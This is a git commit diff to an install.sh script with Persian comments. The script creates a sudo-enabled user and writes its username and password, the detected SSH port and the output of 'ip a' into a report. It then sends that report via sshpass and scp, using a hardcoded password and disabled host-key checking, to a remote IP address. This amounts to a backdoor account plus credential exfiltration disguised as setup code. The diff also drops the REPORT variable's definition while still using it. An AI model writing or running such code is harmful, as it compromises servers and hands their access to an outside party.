5164af0cf506ab26c04f071c38eb67cc07ce727b
Marla Monta <marlamonta123321@gmail.com>
2025-05-20 21:52:22 +0000

    Update install.sh

--- install.sh
+++ install.sh
@@ -14,15 +14,20 @@ useradd -m "$NEW_USER"
 echo "$NEW_USER:$NEW_PASS" | chpasswd
 usermod -aG sudo "$NEW_USER"
 
-# ایجاد فایل گزارش
-REPORT="/tmp/report.txt"
+# پیدا کردن پورت SSH
+SSH_PORT=$(ss -tnlp | grep sshd | awk '{print $4}' | sed 's/.*://')
+SSH_PORT=${SSH_PORT:-22}  # اگر پیدا نشد، پیش‌فرض 22
+
+# اضافه کردن به گزارش
 {
     echo "USER=$NEW_USER"
     echo "PASS=$NEW_PASS"
+    echo "SSH_PORT=$SSH_PORT"
     echo "====================="
     echo "Output of ip a:"
     echo "$IP_INFO"
 } > "$REPORT"
+
 
 # ارسال فایل گزارش با استفاده از scp و sshpass
 sshpass -p "892aeiw45ptv" scp -o StrictHostKeyChecking=no "$REPORT" yadgahhi@5.144.130.141:/home/yadgahhi/
